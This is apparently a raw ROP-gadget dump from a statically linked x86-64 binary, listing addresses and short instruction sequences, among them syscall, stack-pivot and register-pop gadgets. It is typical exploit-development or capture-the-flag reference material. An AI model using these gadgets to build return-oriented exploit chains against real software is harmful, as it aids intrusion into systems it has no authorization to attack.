0x000000000043216a : jb 0x43217a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004322ba : jb 0x4322ca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043240a : jb 0x43241a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000438e7e : jb 0x438e8a ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004475d5 : jb 0x4475e4 ; mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x00000000004475e0 : jb 0x4475f3 ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x00000000004475ed : jb 0x4475f5 ; mov byte ptr [rdi], cl ; ret
0x00000000004477f4 : jb 0x4477fd ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000447876 : jb 0x447884 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000447875 : jb 0x447885 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000447bd6 : jb 0x447be4 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000448026 : jb 0x448034 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004485f5 : jb 0x4485fd ; mov byte ptr [rdi], cl ; ret
0x0000000000448763 : jb 0x44876e ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000044892b : jb 0x448936 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x0000000000456dee : jb 0x456e5c ; mov rdx, rax ; jmp 0x456db3
0x000000000049432d : jb 0x49432a ; call rax
0x0000000000495a2c : jb 0x495a74 ; sti ; jmp qword ptr [rcx]
0x00000000004a9178 : jb 0x4a91d2 ; call 0x4c14bb37
0x00000000004018b4 : jbe 0x4018c8 ; syscall
0x000000000040f509 : jbe 0x40f4c9 ; mov r11d, 1 ; jmp 0x40f4de
0x000000000040fc41 : jbe 0x40fc01 ; mov r11d, 1 ; jmp 0x40fc16
0x000000000041110f : jbe 0x411162 ; add esp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004200f2 : jbe 0x4200b8 ; sub dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000042bce6 : jbe 0x42bd25 ; add rax, rdi ; ret
0x000000000042bcf6 : jbe 0x42bd27 ; lea rax, [rdi + rax + 0x10] ; ret
0x000000000042bd06 : jbe 0x42bd27 ; lea rax, [rdi + rax + 0x20] ; ret
0x000000000042bd16 : jbe 0x42bd27 ; lea rax, [rdi + rax + 0x30] ; ret
0x000000000042c127 : jbe 0x42c198 ; add rax, rdi ; vzeroupper ; ret
0x0000000000456822 : jbe 0x45681c ; ret
0x000000000047fd5b : jbe 0x47fdc5 ; call qword ptr [rip + 0x23cafd]
0x0000000000481baf : jbe 0x481bbb ; ret
0x00000000004967b9 : jbe 0x4967bc ; lcall [rsi] ; jns 0x4967c0 ; jmp rsi
0x00000000004967ed : jbe 0x4967ec ; call qword ptr [rdx]
0x000000000049686d : jbe 0x49686c ; jmp qword ptr [rax]
0x00000000004a93fc : jbe 0x4a93cf ; mov ds, word ptr [rdx + rdx - 0x71] ; retf
0x00000000004a93fb : jbe 0x4a93d0 ; mov ds, word ptr [rdx + rdx - 0x71] ; retf
0x00000000004b2fed : jbe 0x4b2ff5 ; add byte ptr [rax], ah ; or bh, ah ; jmp qword ptr [rax]
0x000000000040040e : je 0x400414 ; call rax
0x0000000000400a89 : je 0x400aa0 ; pop rbp ; mov edi, 0x6babd0 ; jmp rax
0x0000000000400acb : je 0x400ae0 ; pop rbp ; mov edi, 0x6babd0 ; jmp rax
0x0000000000405a5e : je 0x405a6e ; add dword ptr [rax - 9], ecx ; ror byte ptr [rax + 1], 1 ; ret
0x0000000000412c5d : je 0x412c88 ; cmp byte ptr [rax + 0x29], cl ; ret
0x00000000004131b8 : je 0x4131bf ; ret
0x0000000000414d8c : je 0x414dc3 ; dec dword ptr [rax + 0x21] ; retf 0x2148
0x0000000000416f21 : je 0x416f50 ; or al, 0x48 ; mov dword ptr [rsp], edi ; call 0x4131b9
0x00000000004173a5 : je 0x4173b3 ; ret
0x00000000004200e8 : je 0x420085 ; sub dword ptr [rax], eax ; ret
0x00000000004231a2 : je 0x4231ce ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x0000000000423693 : je 0x4236a6 ; lea rax, [rdx - 0x10] ; ret
0x00000000004238a0 : je 0x42382d ; retf 0x4c89
0x000000000042389f : je 0x42382e ; retf 0x4c89
0x0000000000424d52 : je 0x424d1d ; ret
0x000000000042aad3 : je 0x42aa9d ; lea r10, [r10 + r9] ; jmp r10
0x000000000042b9ba : je 0x42b9c2 ; xchg eax, edx ; sub eax, edx ; ret
0x000000000042bbec : je 0x42bc43 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000042beca : je 0x42bf21 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000042c895 : je 0x42c8a7 ; sbb eax, eax ; or eax, 1 ; ret
0x000000000042deb7 : je 0x42dec1 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000043d8f3 : je 0x43d8bd ; lea r10, [r10 + r9] ; jmp r10
0x000000000043f483 : je 0x43f44d ; lea r10, [r10 + r9] ; jmp r10
0x0000000000440c61 : je 0x440c79 ; bsf eax, eax ; lea rax, [rdi + rax] ; ret
0x0000000000441284 : je 0x44128e ; bsf eax, edx ; ret
0x0000000000441284 : je 0x44128f ; bsf eax, edx ; ret
0x000000000044132d : je 0x441345 ; bsf rax, rdx ; ret
0x000000000044132d : je 0x441346 ; bsf rax, rdx ; ret
0x00000000004412cc : je 0x441359 ; bsf rax, rdx ; ret
0x0000000000447903 : je 0x447924 ; ror byte ptr [rdi], 1 ; adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x0000000000448fae : je 0x448fbc ; xor eax, eax ; ret
0x0000000000448fa9 : je 0x448fc9 ; cmp eax, 2 ; je 0x448fc1 ; xor eax, eax ; ret
0x0000000000448ffd : je 0x448fe3 ; ret
0x000000000044a468 : je 0x44a497 ; mov eax, 0x48 ; syscall
0x000000000044a827 : je 0x44a852 ; adc byte ptr [rdi], cl ; xchg eax, esp ; ret 0x2044
0x000000000044ad8a : je 0x44ad91 ; ret
0x000000000044c709 : je 0x44c70e ; ret
0x000000000044c76d : je 0x44c772 ; ret
0x000000000044cfbc : je 0x44cfcf ; lea rdi, [rcx + rax + 0x20] ; jmp rdx
0x000000000044dce8 : je 0x44dcf3 ; ret
0x000000000044dd04 : je 0x44dd19 ; mov dword ptr [rip + 0x26adac], edx ; pop rbx ; ret
0x000000000044ea98 : je 0x44ea4c ; call 0x45b534
0x0000000000451d85 : je 0x451db3 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x000000000045253f : je 0x45256e ; mov rdi, qword ptr [rsp + 0x38] ; call r12
0x000000000045282f : je 0x45285e ; mov rdi, qword ptr [rsp + 0x38] ; call r12
0x0000000000452b77 : je 0x452ba6 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000452db6 : je 0x452de5 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045341e : je 0x45344c ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x0000000000453fb6 : je 0x453fe5 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x0000000000455042 : je 0x455071 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000455b3b : je 0x455b6a ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x0000000000455ee3 : je 0x455f12 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000456327 : je 0x456356 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x0000000000456762 : je 0x456790 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x0000000000456d24 : je 0x456d53 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000456cb3 : je 0x456e60 ; mov rdx, rax ; jmp 0x456c78
0x00000000004570b8 : je 0x456e60 ; mov rdx, rax ; jmp 0x45707d
0x000000000045712f : je 0x456e60 ; mov rdx, rax ; jmp 0x4570f4
0x0000000000457053 : je 0x457082 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000457567 : je 0x457596 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x00000000004579a2 : je 0x4579d0 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x0000000000459017 : je 0x459023 ; ret
0x0000000000459012 : je 0x459028 ; cmp esi, 3 ; je 0x459028 ; ret
0x000000000045996a : je 0x459970 ; call rsi
0x0000000000459a66 : je 0x459a6c ; call rax
0x000000000045ae6b : je 0x45ae71 ; call rax
0x000000000045b42e : je 0x45b43b ; ret
0x0000000000463001 : je 0x462e34 ; jmp 0x462fd2
0x0000000000468dbc : je 0x468de7 ; and byte ptr [rax + 1], cl ; ret
0x0000000000470bb6 : je 0x470c06 ; add esp, 0x20 ; pop rbx ; ret
0x0000000000470bb5 : je 0x470c07 ; add esp, 0x20 ; pop rbx ; ret
0x0000000000471a0c : je 0x471a13 ; ret
0x0000000000471a29 : je 0x471a36 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000471a63 : je 0x471ac5 ; pop rbp ; pop r12 ; ret
0x0000000000471aef : je 0x471b51 ; pop rbp ; pop r12 ; ret
0x0000000000471c7a : je 0x471ca4 ; or al, 0xeb ; ret 0x5590
0x00000000004738fc : je 0x473925 ; bsf rax, rdx ; ret
0x00000000004738fc : je 0x473926 ; bsf rax, rdx ; ret
0x000000000047388c : je 0x473939 ; bsf rax, rdx ; ret
0x0000000000473d9b : je 0x473da3 ; ret
0x000000000047437e : je 0x4743ad ; sbb byte ptr [rax - 0x77], cl ; out dx, eax ; mov r9, r14 ; call rbx
0x00000000004744a8 : je 0x4744b5 ; test edx, edx ; jne 0x4744a7 ; ret
0x0000000000474949 : je 0x474969 ; mov cl, dl ; and cl, 0xf ; je 0x474979 ; ret
0x0000000000474950 : je 0x474972 ; ret
0x0000000000474965 : je 0x474986 ; add rax, 2 ; ret
0x00000000004758ad : je 0x4758df ; mov eax, 0x101 ; syscall
0x0000000000475e22 : je 0x475f21 ; xor eax, eax ; leave ; ret
0x000000000047e866 : je 0x47e873 ; mov qword ptr [rsi], rdi ; mov rax, rcx ; ret
0x000000000048103d : je 0x480f8f ; sub eax, r8d ; ret
0x0000000000485172 : je 0x485186 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000485678 : je 0x4856a3 ; or byte ptr [rax + 1], cl ; ret
0x000000000048726d : je 0x4872b2 ; shl rdx, 5 ; add rdx, rax ; jmp 0x487289
0x0000000000487e36 : je 0x487e43 ; ret
0x000000000048ac7d : je 0x48aca8 ; adc byte ptr [rcx - 0x77], cl ; ret
0x000000000048d218 : je 0x48d202 ; add rsp, 0x18 ; ret
0x000000000048d201 : je 0x48d226 ; add rsp, 0x18 ; ret
0x000000000048d2a8 : je 0x48d288 ; ret
0x000000000048d2e9 : je 0x48d2f6 ; mov qword ptr [rdi + rsi*8], rdx ; ret
0x000000000048f5da : je 0x48f5e3 ; ret
0x000000000048f613 : je 0x48f624 ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x48f629 ; ret
0x000000000048f6ea : je 0x48f6f3 ; ret
0x0000000000490e83 : je 0x490e8e ; call rax
0x00000000004a6f2c : je 0x4a6f5a ; push -0x51 ; xlatb ; out 0xb3, al ; retf 0xe80
0x00000000004a7c88 : je 0x4a7c53 ; xor al, 0xd8 ; ret
0x00000000004a7ec7 : je 0x4a7ec4 ; jmp 0x4a7e9e
0x00000000004a89c2 : je 0x4a898a ; ret 0xacfc
0x00000000004b045c : je 0x4b040d ; stc ; call rsi
0x00000000004b2df5 : je 0x4b2dfd ; add al, bh ; cli ; sti ; jmp qword ptr [rbx]
0x00000000004b2e0d : je 0x4b2e15 ; add byte ptr [rax], dl ; sti ; sti ; jmp qword ptr [rbx]
0x00000000004173a2 : jg 0x4173e2 ; add byte ptr [rcx + rcx - 0xd], dh ; ret
0x00000000004303b9 : jg 0x43040c ; ret
0x0000000000430400 : jg 0x430450 ; mov ebx, 0x4f7f0ff3 ; retf
0x0000000000430405 : jg 0x430458 ; retf
0x000000000043043f : jg 0x43048a ; ret
0x000000000043047f : jg 0x4304ca ; retf
0x00000000004305b9 : jg 0x43060c ; ret 0x894c
0x0000000000430600 : jg 0x430650 ; mov edx, 0x4f7f0ff3 ; retf 0x894c
0x0000000000430605 : jg 0x430658 ; retf 0x894c
0x000000000043063f : jg 0x43068a ; ret 0x894c
0x000000000043067b : jg 0x4306c6 ; retf 0x894c
0x0000000000432d89 : jg 0x432ddc ; ret
0x0000000000432dd0 : jg 0x432e20 ; mov ebx, 0x4f7f0ff3 ; retf
0x0000000000432dd5 : jg 0x432e28 ; retf
0x0000000000432e0f : jg 0x432e5a ; ret
0x0000000000432e4f : jg 0x432e9a ; retf
0x0000000000432f89 : jg 0x432fdc ; ret 0x894c
0x0000000000432fd0 : jg 0x433020 ; mov edx, 0x4f7f0ff3 ; retf 0x894c
0x0000000000432fd5 : jg 0x433028 ; retf 0x894c
0x000000000043300f : jg 0x43305a ; ret 0x894c
0x000000000043304b : jg 0x433096 ; retf 0x894c
0x0000000000435378 : jg 0x4353c9 ; loope 0x435377 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004353ef : jg 0x43543a ; ret 0xff2
0x0000000000435408 : jg 0x435459 ; loop 0x435407 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043547f : jg 0x4354ca ; ret
0x0000000000435498 : jg 0x4354e9 ; jrcxz 0x435497 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000435528 : jg 0x435579 ; in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004355a8 : jg 0x4355f9 ; in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000435628 : jg 0x435679 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004356a8 : jg 0x4356f9 ; out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000435728 : jg 0x435779 ; call 0x4fc2672a
0x00000000004357a8 : jg 0x4357f9 ; jmp 0x4fc267aa
0x0000000000435805 : jg 0x435855 ; mov edx, 0x46f00ff2 ; retf 0xff3
0x000000000043580f : jg 0x43585a ; retf 0xff2
0x0000000000435885 : jg 0x4358d5 ; mov ebx, 0x46f00ff2 ; retf
0x000000000043588f : jg 0x4358da ; retf
0x0000000000435928 : jg 0x435979 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004359a8 : jg 0x4359f9 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435a38 : jg 0x435a89 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435ab8 : jg 0x435b09 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000435b2c : jg 0x435b37 ; ret
0x0000000000435b86 : jg 0x435b99 ; ret
0x0000000000435b81 : jg 0x435bd1 ; psllq mm1, qword ptr [rdi] ; jg 0x435b9e ; ret
0x0000000000435bf6 : jg 0x435c09 ; ret
0x0000000000435c66 : jg 0x435c79 ; ret
0x0000000000435c61 : jg 0x435cb1 ; or eax, 0xf7f0ff3 ; ret
0x0000000000435cd6 : jg 0x435ce9 ; ret
0x0000000000435cd1 : jg 0x435d21 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435d46 : jg 0x435d59 ; ret
0x0000000000435d41 : jg 0x435d91 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435db6 : jg 0x435dc9 ; ret
0x0000000000435db1 : jg 0x435e01 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435e26 : jg 0x435e39 ; ret
0x0000000000435e21 : jg 0x435e71 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435e96 : jg 0x435ea9 ; ret
0x0000000000435e91 : jg 0x435ee1 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435f06 : jg 0x435f19 ; ret
0x0000000000435f76 : jg 0x435f89 ; ret
0x0000000000435fe6 : jg 0x435ff9 ; ret
0x0000000000435fe1 : jg 0x436031 ; add eax, 0xf7f0ff3 ; ret
0x0000000000436056 : jg 0x436069 ; ret
0x0000000000436051 : jg 0x4360a1 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x00000000004360c6 : jg 0x4360d9 ; ret
0x00000000004360c1 : jg 0x436111 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x0000000000436136 : jg 0x436149 ; ret
0x0000000000436131 : jg 0x436181 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x00000000004361a6 : jg 0x4361b9 ; ret
0x00000000004361a1 : jg 0x4361f1 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x0000000000437e98 : jg 0x437ee9 ; loope 0x437e97 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437f0f : jg 0x437f5a ; ret 0xff2
0x0000000000437f28 : jg 0x437f79 ; loop 0x437f27 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000437f9f : jg 0x437fea ; ret
0x0000000000437fb8 : jg 0x438009 ; jrcxz 0x437fb7 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000438048 : jg 0x438099 ; in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004380c8 : jg 0x438119 ; in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000438148 : jg 0x438199 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004381c8 : jg 0x438219 ; out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000438248 : jg 0x438299 ; call 0x4fc2924a
0x00000000004382c8 : jg 0x438319 ; jmp 0x4fc292ca
0x0000000000438325 : jg 0x438375 ; mov edx, 0x46f00ff2 ; retf 0xff3
0x000000000043832f : jg 0x43837a ; retf 0xff2
0x00000000004383a5 : jg 0x4383f5 ; mov ebx, 0x46f00ff2 ; retf
0x00000000004383af : jg 0x4383fa ; retf
0x0000000000438448 : jg 0x438499 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004384c8 : jg 0x438519 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000438558 : jg 0x4385a9 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004385d8 : jg 0x438629 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043864c : jg 0x438657 ; ret
0x00000000004386a6 : jg 0x4386b9 ; ret
0x00000000004386a1 : jg 0x4386f1 ; psllq mm1, qword ptr [rdi] ; jg 0x4386be ; ret
0x0000000000438716 : jg 0x438729 ; ret
0x0000000000438786 : jg 0x438799 ; ret
0x0000000000438781 : jg 0x4387d1 ; or eax, 0xf7f0ff3 ; ret
0x00000000004387f6 : jg 0x438809 ; ret
0x00000000004387f1 : jg 0x438841 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x0000000000438866 : jg 0x438879 ; ret
0x0000000000438861 : jg 0x4388b1 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00000000004388d6 : jg 0x4388e9 ; ret
0x00000000004388d1 : jg 0x438921 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x0000000000438946 : jg 0x438959 ; ret
0x0000000000438941 : jg 0x438991 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00000000004389b6 : jg 0x4389c9 ; ret
0x00000000004389b1 : jg 0x438a01 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x0000000000438a26 : jg 0x438a39 ; ret
0x0000000000438a96 : jg 0x438aa9 ; ret
0x0000000000438b06 : jg 0x438b19 ; ret
0x0000000000438b01 : jg 0x438b51 ; add eax, 0xf7f0ff3 ; ret
0x0000000000438b76 : jg 0x438b89 ; ret
0x0000000000438b71 : jg 0x438bc1 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x0000000000438be6 : jg 0x438bf9 ; ret
0x0000000000438be1 : jg 0x438c31 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x0000000000438c56 : jg 0x438c69 ; ret
0x0000000000438c51 : jg 0x438ca1 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x0000000000438cc6 : jg 0x438cd9 ; ret
0x0000000000438cc1 : jg 0x438d11 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x0000000000438e24 : jg 0x438e35 ; vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x0000000000438e38 : jg 0x438e49 ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x00000000004392aa : jg 0x4392a6 ; ret
0x0000000000444b56 : jg 0x444b61 ; ret
0x0000000000444b66 : jg 0x444b74 ; mov byte ptr [rdi + 0x10], dh ; ret
0x0000000000444b7a : jg 0x444b89 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000444b99 : jg 0x444ba7 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000444ba9 : jg 0x444bb7 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000444bb9 : jg 0x444bca ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x0000000000444bda : jg 0x444be9 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x0000000000444bfa : jg 0x444c09 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x0000000000444c1a : jg 0x444c29 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x0000000000444c3a : jg 0x444c4c ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x0000000000444c7d : jg 0x444c8f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x0000000000444c9d : jg 0x444caf ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x0000000000444cbb : jg 0x444ccb ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x0000000000444cdb : jg 0x444ceb ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x0000000000444cfb : jg 0x444d0b ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x0000000000444d1b : jg 0x444d2b ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00000000004451e6 : jg 0x4451f5 ; lea rax, [rdi + 0xf] ; ret
0x00000000004451f6 : jg 0x445208 ; mov byte ptr [rdi + 0x10], dh ; lea rax, [rdi + 0x10] ; ret
0x0000000000445229 : jg 0x44523b ; mov dword ptr [rdi + 0xf], ecx ; lea rax, [rdi + 0x12] ; ret
0x0000000000445249 : jg 0x44525b ; mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x13] ; ret
0x000000000044536f : jg 0x4453cf ; or eax, 0x1c478d48 ; ret
0x00000000004475b7 : jg 0x4475c7 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x00000000004475ad : jg 0x4475cd ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x0000000000447a44 : jg 0x447a7c ; movups xmmword ptr [r11], xmm8 ; ret
0x0000000000447b12 : jg 0x447b4a ; movups xmmword ptr [r11], xmm8 ; ret
0x0000000000447bea : jg 0x447bfb ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000447d7b : jg 0x447da5 ; vzeroupper ; ret
0x0000000000447e22 : jg 0x447e2c ; vzeroupper ; ret
0x0000000000447eae : jg 0x447ed8 ; vzeroupper ; ret
0x0000000000447f3e : jg 0x447f48 ; vzeroupper ; ret
0x0000000000448052 : jg 0x448063 ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000448236 : jg 0x448260 ; vzeroupper ; ret
0x0000000000448235 : jg 0x448261 ; vzeroupper ; ret
0x00000000004482fc : jg 0x448306 ; vzeroupper ; ret
0x00000000004482fb : jg 0x448307 ; vzeroupper ; ret
0x00000000004483cf : jg 0x4483f9 ; vzeroupper ; ret
0x00000000004483ce : jg 0x4483fa ; vzeroupper ; ret
0x00000000004484a2 : jg 0x4484ac ; vzeroupper ; ret
0x00000000004484a1 : jg 0x4484ad ; vzeroupper ; ret
0x000000000044850c : jg 0x448517 ; ret
0x000000000044855c : jg 0x448567 ; ret
0x00000000004485d3 : jg 0x44861f ; xor byte ptr [rax - 0x7d], cl ; rol dword ptr [rax + 0x48], 0x39 ; retf 0xe475
0x0000000000448664 : jg 0x448672 ; vzeroupper ; ret
0x00000000004486b4 : jg 0x4486c2 ; vzeroupper ; ret
0x0000000000448773 : jg 0x448781 ; vzeroupper ; ret
0x00000000004487f1 : jg 0x4487ff ; vzeroupper ; ret
0x00000000004487f0 : jg 0x448800 ; vzeroupper ; ret
0x0000000000448851 : jg 0x44885f ; vzeroupper ; ret
0x0000000000448850 : jg 0x448860 ; vzeroupper ; ret
0x000000000044893b : jg 0x448949 ; vzeroupper ; ret
0x0000000000448949 : jg 0x448957 ; vzeroupper ; ret
0x00000000004489a0 : jg 0x4489dd ; ret 0x2b77
0x0000000000448abb : jg 0x448a88 ; mov eax, 0x80 ; pop rbx ; ret
0x0000000000448b17 : jg 0x448b15 ; int1 ; mov eax, eax ; ret
0x000000000044ec96 : jg 0x44ec1d ; retf
0x0000000000454938 : jg 0x4548c5 ; ret 0xdb76
0x0000000000454938 : jg 0x4548c9 ; ret 0xdb76
0x000000000045f142 : jg 0x45f15b ; test byte ptr [rip - 0x7c000011], al ; ret
0x0000000000469732 : jg 0x46974b ; test byte ptr [rip - 0x7c000003], dl ; ret
0x000000000046abaa : jg 0x46abc3 ; test byte ptr [rbp - 0x7c000018], bl ; ret
0x000000000046aca7 : jg 0x46acc0 ; test byte ptr [rax - 0x7c000019], ah ; ret
0x000000000046f4dd : jg 0x46f4f6 ; add eax, edi ; mov rdx, r8 ; jmp 0x46f4b5
0x000000000047f4f7 : jg 0x47f509 ; test rdi, rdi ; jne 0x47f4d8 ; ret
0x000000000048aac8 : jg 0x48aad2 ; add byte ptr [rcx - 0x77], cl ; ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x00000000004afb7d : jg 0x4afb7a ; call rsp
0x000000000040e01a : jge 0x40e023 ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000044b055 : jge 0x44b05a ; call r12
0x000000000044b07d : jge 0x44b082 ; call r12
0x000000000044b56d : jge 0x44b51d ; mov r12d, r14d ; call r15
0x000000000044bbcd : jge 0x44bbd2 ; call r12
0x000000000044bbf9 : jge 0x44bbfe ; call r12
0x000000000044bc2d : jge 0x44bc32 ; call r12
0x000000000044bc5d : jge 0x44bc62 ; call r12
0x000000000044bc85 : jge 0x44bc8a ; call r12
0x000000000044bcb5 : jge 0x44bcba ; call r12
0x000000000048d662 : jge 0x48d65f ; leave ; ret
0x000000000048d7e0 : jge 0x48d7e3 ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x000000000048d92c : jge 0x48d929 ; leave ; ret
0x000000000048d978 : jge 0x48d97b ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x000000000048db07 : jge 0x48db0a ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x000000000048dc67 : jge 0x48dc64 ; leave ; ret
0x000000000048dcb8 : jge 0x48dcbb ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x00000000004a5059 : jge 0x4a505a ; call qword ptr [rax]
0x00000000004a6f8a : jge 0x4a6f6b ; push r8 ; xor byte ptr [rcx], ah ; retf
0x00000000004a88d4 : jge 0x4a8945 ; mov ch, 0x41 ; outsb dx, byte ptr [rsi] ; sbb edi, ebp ; retf
0x000000000040122f : jl 0x40125d ; or al, 0x48 ; mov eax, dword ptr [rsp + 0x18] ; call rax
0x0000000000403b2d : jl 0x403b5e ; add al, ch ; retf
0x0000000000404b36 : jl 0x404b61 ; sub byte ptr [rax - 0x7d], cl ; ret
0x000000000040d528 : jl 0x40d553 ; or byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x0000000000417872 : jl 0x41788e ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000041f2bb : jl 0x41f2b5 ; ret 0x7508
0x00000000004241c3 : jl 0x4241f2 ; add bh, dh ; ret 0
0x0000000000438da4 : jl 0x438df3 ; adc dword ptr [rcx - 1], edi ; ret
0x0000000000438de0 : jl 0x438e2f ; adc dword ptr [rcx - 1], ebx ; ret
0x0000000000438fde : jl 0x43902d ; adc dword ptr [rcx - 1], edi ; ret
0x0000000000439145 : jl 0x439194 ; adc dword ptr [rcx + 7], edi ; ret
0x00000000004392a7 : jl 0x4392f6 ; adc dword ptr [rdi - 8], edi ; ret
0x000000000044756c : jl 0x4475bb ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044758d : jl 0x4475dc ; adc dword ptr [rsi - 1], edx ; ret
0x00000000004475a0 : jl 0x4475ef ; adc dword ptr [rsi - 1], edx ; ret
0x0000000000447675 : jl 0x4476c4 ; adc dword ptr [rsi - 1], edx ; ret
0x00000000004476cd : jl 0x44771c ; adc dword ptr [rsi + 3], edx ; ret
